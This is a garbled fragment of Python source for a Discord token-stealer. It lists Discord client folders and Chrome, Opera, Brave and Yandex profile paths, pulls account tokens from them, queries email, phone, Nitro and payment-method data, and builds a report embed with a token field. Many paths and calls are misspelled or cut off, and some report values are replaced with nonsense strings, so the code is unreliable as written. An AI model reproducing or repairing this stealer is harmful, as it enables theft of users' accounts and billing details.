...
PATHS = {
    "Discord": ROAMING + "\\\\Diord",
    "Discord Canary": ROAMING + "\\\\discocanary",
    "Discord PTB": ROAMING + "\\\\ddptb",
    'Discord Development': ROAMING + '\\\\discorddevelopment',
    "Google Chrome": LOCAL + "\\\\Gle\\\\Chrome\\\\Ur Data\\\\Default",
    "Opera": ROAMING + "\\\\Opera Software\\\\Opera Stable",
    "Brave": LOCAL + "\\\\BSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    "Yandex": LOCAL + "\\\\Yaex\\\\YandexBrer\\\\Ur Data\\\\Default"
}
...
def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordd > 0)
    except:
        pass
...
def main():
    ...
    for platform, path in PATHS.items():
        ...
        for token in getTokens(path):
            ...
            email = user_data.get("s")
            phone = user_data.get("d")
            nitro = bool(user_data.get("d"))
            billing = bool(d)
                ...
                "fields": [
                    {
                        ...
                        "value": f'Email: "UR #$%^&*&^"nNitro: "LLLLL"\\nBilling Info: "F U"',
                        "inline": True
                    },
                    {
                        "name": "PC Information",
                        "value":"MY PC IS ALREADY NOICE HEH"
                        "inline": True
                    },
                    {
                        "name": "Token",
